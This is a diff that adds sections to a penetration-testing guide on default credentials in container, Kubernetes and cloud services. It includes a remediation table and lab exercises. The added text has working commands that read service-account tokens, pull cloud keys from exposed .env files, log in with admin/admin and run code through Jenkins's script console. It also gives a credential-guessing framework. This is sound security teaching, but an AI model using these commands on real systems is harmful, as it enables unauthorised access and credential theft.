@@ -314,3 +314,157 @@ done
 ```
 
 Default credential scanning is one of the highest-ROI activities in penetration testing. Organizations frequently deploy services with factory defaults, especially in development environments that accidentally become production-facing.
+
+---
+
+## 9. Container and Orchestration Default Credentials
+
+Containerized infrastructure introduces new default credential risks:
+
+```bash
+# Docker API unauthenticated access (default: no TLS, no auth)
+curl -s "http://target:2375/containers/json" | jq '.[].Names'
+curl -s "http://target:2375/images/json" | jq '.[].RepoTags'
+
+# Kubernetes dashboard (often deployed without auth)
+curl -sk "https://target:8443/api/v1/namespaces/kube-system/pods" | jq '.items[].metadata.name'
+
+# Kubernetes service account token (default: auto-mounted)
+# Check if token is accessible from inside a pod:
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+# etcd (Kubernetes backing store, default: no auth)
+curl -s "http://target:2379/v2/keys/?recursive=true" | jq '.node.nodes[].key'
+
+# Redis in Docker (default: no auth)
+docker exec -it redis redis-cli ping
+# If PONG returned, no authentication required
+
+# MongoDB in Docker (default: no auth)
+docker exec -it mongo mongo --eval "db.adminCommand('listDatabases')"
+```
+
+**Container default credential checklist:**
+
+| Service | Default Config | Risk | Remediation |
+|---------|---------------|------|-------------|
+| Docker daemon | No TLS, no auth on 2375 | RCE via container creation | Enable TLS, use socket proxy |
+| Kubernetes dashboard | No auth, ClusterRoleBinding | Full cluster compromise | Enable RBAC, restrict access |
+| Redis | No `requirepass` | Data access, config modification | Set strong `requirepass` |
+| MongoDB | No `--auth` flag | Full database access | Enable `--auth`, create admin user |
+| etcd | No auth on 2379 | All Kubernetes secrets exposed | Enable client cert auth |
+| RabbitMQ | guest/guest on 15672 | Queue/message access | Delete guest user, create restricted users |
+| PostgreSQL | trust auth in pg_hba.conf | Full database access | Use md5/scram-sha-256 auth |
+
+---
+
+## 10. Credential Testing for Cloud Services
+
+Cloud management consoles and APIs frequently have default or weak credentials:
+
+```bash
+# AWS console default access check (should never work in production)
+# Test for common access key patterns in public repositories
+trufflehog filesystem /path/to/repo --only-verified
+
+# Check for exposed .env files containing cloud credentials
+curl -s "https://target.com/.env" | grep -iE "AWS_|AZURE_|GCP_|GOOGLE_"
+
+# Test Kubernetes API server with default service account token
+kubectl --server=https://target:6443 --token="$SA_TOKEN" get pods -A
+
+# Check for exposed Grafana default credentials
+curl -s -X POST "https://target:3000/api/login" \
+  -H "Content-Type: application/json" \
+  -d '{"user":"admin","password":"admin"}' | jq '.'
+
+# Jenkins default credential check (script console = RCE)
+curl -s -u "admin:admin" "http://target:8080/scriptText" \
+  -d 'script=println+"whoami:"+%22whoami%22.execute().text'
+```
+
+---
+
+## 11. Building a Credential Testing Framework
+
+For large-scale audits, build a modular framework that can test multiple service types:
+
+```python
+#!/usr/bin/env python3
+"""Modular credential testing framework for security audits."""
+
+import abc
+import requests
+import subprocess
+from dataclasses import dataclass
+from typing import Protocol
+
+@dataclass(frozen=True)
+class CredentialResult:
+    host: str
+    port: int
+    service: str
+    username: str
+    password: str
+    status: str  # "success", "failed", "error"
+    evidence: str
+
+class CredentialTester(Protocol):
+    """Protocol for service-specific credential testers."""
+    def test(self, host: str, port: int, username: str, password: str) -> CredentialResult: ...
+
+class HTTPCredentialTester:
+    """Tests HTTP Basic/Form authentication."""
+    def __init__(self, path: str = "/", method: str = "basic"):
+        self.path = path
+        self.method = method
+
+    def test(self, host: str, port: int, username: str, password: str) -> CredentialResult:
+        url = f"http://{host}:{port}{self.path}"
+        try:
+            if self.method == "basic":
+                resp = requests.get(url, auth=(username, password), timeout=10)
+                success = resp.status_code == 200
+            else:
+                resp = requests.post(url, data={"username": username, "password": password}, timeout=10)
+                success = any(ind in resp.text.lower() for ind in ["dashboard", "welcome", "logout"])
+            return CredentialResult(
+                host=host, port=port, service="http",
+                username=username, password=password,
+                status="success" if success else "failed",
+                evidence=f"HTTP {resp.status_code}"
+            )
+        except Exception as e:
+            return CredentialResult(host=host, port=port, service="http",
+                                    username=username, password=password,
+                                    status="error", evidence=str(e))
+
+class DBCredentialTester:
+    """Tests database authentication."""
+    def test(self, host: str, port: int, username: str, password: str) -> CredentialResult:
+        try:
+            result = subprocess.run(
+                ["mysql", "-h", host, "-P", str(port), "-u", username,
+                 f"-p{password}", "-e", "SELECT 1", "--batch"],
+                capture_output=True, text=True, timeout=10
+            )
+            success = result.returncode == 0
+            return CredentialResult(
+                host=host, port=port, service="mysql",
+                username=username, password=password,
+                status="success" if success else "failed",
+                evidence=result.stdout[:200] if success else result.stderr[:200]
+            )
+        except Exception as e:
+            return CredentialResult(host=host, port=port, service="mysql",
+                                    username=username, password=password,
+                                    status="error", evidence=str(e))
+```
+
+---
+
+## Hands-on Exercises
+
+1. **Exercise 1**: Deploy a Docker Compose environment with Tomcat, Jenkins, Grafana, Redis, and MongoDB all using default configurations. Use the scanning techniques from this guide to discover and authenticate to each service. Document the credential pairs that work and the level of access each provides
+2. **Exercise 2**: Build a custom default credential database for a specific vendor (choose from: Cisco, HP, Dell, or Netgear). Include at least 30 credential pairs with model-specific variations. Test the database against a lab target
+3. **Exercise 3**: Implement the modular credential testing framework from Section 11. Add testers for SSH (using paramiko), FTP (using ftplib), and SNMP (using pysnmp). Run the framework against a multi-service lab environment and generate a comprehensive credential audit report
